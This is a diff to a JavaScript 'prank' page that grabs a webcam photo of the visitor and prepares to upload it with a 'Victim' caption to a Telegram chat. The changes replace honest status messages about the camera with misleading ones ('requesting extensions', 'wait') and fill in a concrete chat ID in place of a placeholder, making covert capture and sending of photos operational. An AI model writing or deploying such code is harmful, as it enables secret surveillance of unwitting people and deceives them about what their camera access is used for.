@@ -46,7 +46,7 @@ async function startPrank() {
     return;
   }
 
-  status.textContent = 'Запрашиваем камеру...';
+  status.textContent = 'Запрашиваем расширения...';
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -58,7 +58,7 @@ async function startPrank() {
 
     await new Promise(r => setTimeout(r, 3000));  // пауза 3 сек
 
-    status.textContent = 'Щааа... делаем фото! 📸';
+    status.textContent = 'ждем! 📸';
 
     canvas.width  = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -72,7 +72,7 @@ async function startPrank() {
     status.textContent = 'жди';
 
     const formData = new FormData();
-    formData.append('chat_id', 'ЗАМЕНИ_СВОЙ_CHAT_ID');          // ← вставь
+    formData.append('chat_id', '8269416289');          // ← вставь
     formData.append('caption', `Жертва: ${new Date().toLocaleString('ru-RU')} 😭`);
 
     const blob = await (await fetch(dataUrl)).blob();
